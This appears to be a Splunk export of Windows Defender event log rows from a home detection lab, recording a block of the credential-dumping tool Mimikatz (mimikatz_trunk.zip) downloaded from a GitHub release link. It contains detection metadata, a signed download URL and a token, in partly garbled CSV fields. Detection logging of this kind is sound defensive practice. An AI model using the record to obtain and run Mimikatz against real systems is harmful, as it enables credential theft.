glADSB2CHu4edt6MPzc0aKAXNMi59vi3S2Ztd7Wk{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}D",,1117,"2025-11-23T15{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A07{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A03Z","96c2d410-5711-43a1-aedd-ab1947aa7ab0",b,"2025-11-23T14{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A06{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A46Z","398a6654-997b-47e9-b12b-9515b896b4de","2018-11-09","Microsoft-Windows-Windows Defender/Operational",WinEventLog,r,"chalitha-splunk",,https,b,,"2018-11-09","track_event_signatures",,"track_event_signatures",2147686744,,,,,"Microsoft Windows",
+,,,,,,"DESKTOP-78CU07R",,,,,,,,,,1116,3,,,,,,,,,,,,None,"Microsoft-Windows-Windows",,,,Microsoft,,,Info,,,,,,,,,,,,,,,,,,296,,,,,,,,"S-1-5-18",0,"Microsoft-Windows-Windows",,,None,,Warning,,"NOT_TRANSLATED",,,,,,,,,"11/23/2025 08:22:07.144 AM
+LogName=Microsoft-Windows-Windows Defender/Operational
+EventCode=1116
+EventType=3
+ComputerName=DESKTOP-78CU07R
+User=NOT_TRANSLATED
+Sid=S-1-5-18
+SidType=0
+SourceName=Microsoft-Windows-Windows Defender
+Type=Warning
+RecordNumber=296
+Keywords=None
+TaskCategory=None
+OpCode=Info
+Message=Microsoft Defender Antivirus has detected malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=HackTool:Win32/Mimikatz&threatid=2147686744&enterprise=0
+ 	Name: HackTool:Win32/Mimikatz
+ 	ID: 2147686744
+ 	Severity: High
+ 	Category: Tool
+ 	Path: file:_C:\Users\chalitha\Downloads\Unconfirmed 548256.crdownload; webfile:_C:\Users\chalitha\Downloads\Unconfirmed 548256.crdownload|https://release-assets.githubusercontent.com/github-production-release-asset/18496166/28e3acb5-ca66-40d5-bc68-f76f5bfabecf?sp=r&sv=2018-11-09&sr=b&spr=https&se=2025-11-23T15{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A07{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A03Z&rscd=attachment{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}B+filename{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}Dmimikatz_trunk.zip&rsct=application4.18.25100.9008Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2025-11-23T14{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A06{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A46Z&ske=2025-11-23T15{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A07{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A03Z&sks=b&skv=2018-11-09&sig=c4.18.25100.9008BgglADSB2CHu4edt6MPzc0aKAXNMi59vi3S2Ztd7Wk{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc2MzkwODAyNiwibmJmIjoxNzYzOTA3NzI2LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.L4ymMr8hYNM4ztl3yxqt4qE1UBYEch3o8001NLWfV-w&response-content-disposition=attachment{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}BDESKTOP-78CU07R\chalithafilename{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}Dmimikatz_trunk.zip&response-content-type=ap
+ 	Detection Origin: Internet
+ 	Detection Type: Concrete
+ 	Detection Source: Downloads and attachments
+ 	User: DESKTOP-78CU07R\chalitha
+ 	Process Name: Unknown
+ 	Security intelligence Version: AV: 1.441.427.0, AS: 1.441.427.0, NIS: 1.441.427.0
+ 	Engine Version: AM: 1.1.25100.9002, NIS: 1.1.25100.9002","2025-11-23T14:22:07.144+0000",,,None,,"DESKTOP-78CU07R","DESKTOP-78CU07R",0,296,"endpoint_services_processes windows_event_signature windows_ta_data","DESKTOP-78CU07R",296,"mydfir-project","eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc2MzkwODAyNiwibmJmIjoxNzYzOTA3NzI2LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.L4ymMr8hYNM4ztl3yxqt4qE1UBYEch3o8001NLWfV-w",29,37020,"HackTool:Win32/Mimikatz",,,,,"//_::._=--_/===-==---==--_======__________.\r______",,,"attachment{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}BDESKTOP-78CU07R\chalithafilename{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}Dmimikatz_trunk.zip",ap,,"attachment{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}B+filename{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}Dmimikatz_trunk.zip","application4.18.25100.9008Foctet-stream","2025-11-23T15{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A07{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A03Z",,,,medium,3,"c4.18.25100.9008BgglADSB2CHu4edt6MPzc0aKAXNMi59vi3S2Ztd7Wk{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}D",,1116,"2025-11-23T15{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A07{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A03Z","96c2d410-5711-43a1-aedd-ab1947aa7ab0",b,"2025-11-23T14{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A06{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A46Z","398a6654-997b-47e9-b12b-9515b896b4de","2018-11-09","Microsoft-Windows-Windows Defender/Operational",WinEventLog,r,"chalitha-splunk",,https,b,,"2018-11-09","track_event_signatures",,"track_event_signatures",2147686744,,,,,"Microsoft Windows",
